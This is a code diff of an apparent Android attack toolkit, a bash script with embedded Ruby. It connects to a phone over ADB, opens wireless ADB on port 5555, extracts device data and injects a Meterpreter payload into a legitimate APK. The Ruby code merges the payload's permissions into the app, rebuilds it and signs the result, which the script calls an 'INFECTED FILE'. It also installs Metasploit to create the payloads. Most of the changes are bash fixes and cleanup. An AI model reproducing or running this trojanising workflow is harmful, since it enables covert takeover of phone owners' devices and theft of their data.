@@ -29,11 +29,17 @@ CYAN='\033[0;36m'
 #######################################################################################################################
 #                                                    SUBFUNCTIONS                                                     #
 #######################################################################################################################
+# EXIT TRAP CTRL + C
+EXITCODE() {
+	${WDIR}/bin/adb kill-server
+	exit
+}
+
 # CHECK IF AUTO MODE IS ENABLED, IF SO, PROMPT FOR ALL CONFIGURATION VARIABLES.
 CHKAUTO() {
 	if [[ ${AUTOMODE} == "1" ]]; then
 		# IF THE OPTION CHOSEN BEFORE WAS JUST EXTRACTION
-		if [[ ${MENU} -eq 5 ]] || [[ ${MENU} -eq 6]]; then
+		if [[ ${MENU} -eq 4 ]]; then
 			NAME_PROMPT
 			DCIM_PROMPT
 			BACKUP_PROMPT
@@ -226,7 +232,7 @@ end
 
 def IMPORT_PERMISSIONS()
 	payload_permissions=[]
-	
+
 	#Load payload's permissions
 	File.open("payload/AndroidManifest.xml","r"){|file|
 		k=File.read(file)
@@ -240,7 +246,7 @@ def IMPORT_PERMISSIONS()
 	}
 	Legitimate_permissions=[]
 	apk_mani=''
-	
+
 	#Load Legitimate apk's permissions
 	File.open("Legitimate/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
@@ -323,7 +329,6 @@ IMPORT_PERMISSIONS()
 print "[*] REBUILDING #{LEGITIMATE_APK} WITH METERPRETER INJECTION AS #{injected_apk} ...\n"
 `apktool b -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
 print "[*] SIGNING #{injected_apk} ...\n"
-`mkdir $WDIR/bin/Payloads/Signed/`
 `java -jar $WDIR/bin/signapk.jar testkey.pk8 testkey.x509.pem $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
 
 puts "[+] INFECTED FILE $WDIR/bin/Payloads/Signed/#{injected_apk} READY.\n"
@@ -489,7 +494,7 @@ EOF
 #                                                 MAIN CONFIGURATION                                                  #
 #######################################################################################################################
 # ENABLE CLEANLY EXIT WITH CTRL+C ######## UNFINISHED
-clear
+trap 'EXITCODE' SIGHUP SIGINT SIGTERM SIGQUIT
 
 # DETERMINE IF USER IS ROOT
 if [ "`id -u`" -eq 0 ]; then
@@ -510,7 +515,7 @@ fi
 # INSTALL DEPENDENCIES
 # INSTALL JAVA 7 FOR apktool
 # IF JAVA VERSION IS NOT 7 INSTALLS IT
-if [ ! java -version 2>1& | awk -F\" '/version/ {print$2}' | grep "1.7" -oE ]; then
+if [ ! `java -version 2>&1 | awk -F\" '/version/ {print$2}' | grep '1.7' -oE` == '1.7' ]; then
 	# INSTALLS JAVA 7 AND UPDATE ALTERNATIVES FOR DUPLICATE CANDIDATES
 	apt-get install openjdk-7-jdk && update-alternatives --config java
 	# FOLLOW SYMLINKS TO ACTUAL JAVA BINARY AND SET PATH VARIABLE
@@ -522,7 +527,7 @@ if [ ! java -version 2>1& | awk -F\" '/version/ {print$2}' | grep "1.7" -oE ]; t
 fi
 
 # apktool FOR INJECTION AND HIDDEN
-if [[ ! apktool -version | grep "2." ]]; then
+if [ ! `apktool -version | grep "2."` ]; then
 	# DOWNLOAD WRAPPER
 	wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/bin/apktool
 	# DOWNLOAD MAIN JAR
@@ -530,20 +535,20 @@ if [[ ! apktool -version | grep "2." ]]; then
 	# ALLOW EXECUTION
 	chmod +x /usr/bin/apktool /usr/bin/apktool.jar
 	# INSTALL COMPATIBILITY WITH 32 BITS MACHINE
-	apt-get install lib32stdc++6 lib32ncurses5 lib32z1
+	apt-get install lib32stdc++6 lib32ncurses5 lib32z1 > /dev/null
 fi
 
 # METASPLOIT FRAMEWORK FOR PAYLOAD CREATION AND HANDLER
-if [ ! which msfvenom ]; then
-	if [[ ! uname -a | grep "kali" ]]; then
-		apt-get install metasploit-framework
+if [ ! `which msfvenom` ]; then
+	if [ ! `uname -a | grep "kali"` ]; then
+		apt-get install metasploit-framework -y
 	else
 		echo -e "${RED}METASPLOIT FRAMEWORK NOT INSTALLED AND YOUR LINUX DISTRO IS NOT KALI, INSTALL IT IF WANT TO USE THE PAYLOAD GENERATOR FEATURES.${NONE}"
 	fi
 fi
 
 # SSHPASS
-if [[ ! type sshpass ]] > /dev/null; then
+if [ ! `which sshpass` ]; then
 	echo -e "${BOLD}${RED}SSHPASS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
 	apt-get install sshpass -y
 fi
@@ -552,14 +557,15 @@ fi
 . ${WDIR}/config
 . ${WDIR}/server
 
-# CREATE TEMPORARY DIRECTORY 
-mkdir ${WDIR}/tmp/ > /dev/null
+# CREATE TEMPORARY DIRECTORY
+mkdir -p ${WDIR}/tmp/
 
 # ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
 while true; do
 	# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
 	if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
 			echo -e "${BOLD}CONNECT THE DEVICE${NONE}"
+			${WDIR}/bin/adb start-server > /dev/null
 			${WDIR}/bin/adb wait-for-device > /dev/null
 	fi
 	# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
@@ -576,15 +582,15 @@ while true; do
 		break
 	else
 		# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
-		if [ grep -oE "device" ${WDIR}/tmp/ADB_Devices ]; then
+		if [ `grep -oE "device" ${WDIR}/tmp/ADB_Devices` ]; then
 			# GET DEVICE IP WHILE ITS STILL CONNECTED
 			DEVICE_IP=$(${WDIR}/bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)
 			# ATTEMPT TO CONNECT WIRELESSLY
 			${WDIR}/bin/adb tcpip 5555
 			# ATTEMPT WIRELESS CONNECTION IF NOT CONNECTED
-			if  ! ${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE; then
+			if [ ! `${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE` ]; then
 				# IF NOT CHECK IF IT IS STILL CONNECTED TO USB
-				if ${WDIR}/bin/adb devices | grep "device" -oE; then
+				if [ `${WDIR}/bin/adb devices | grep "device" -oE` ]; then
 					# IF IT IS, DISPLAY CONNECTED LOCALLY
 					CONNECTED=1
 					STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
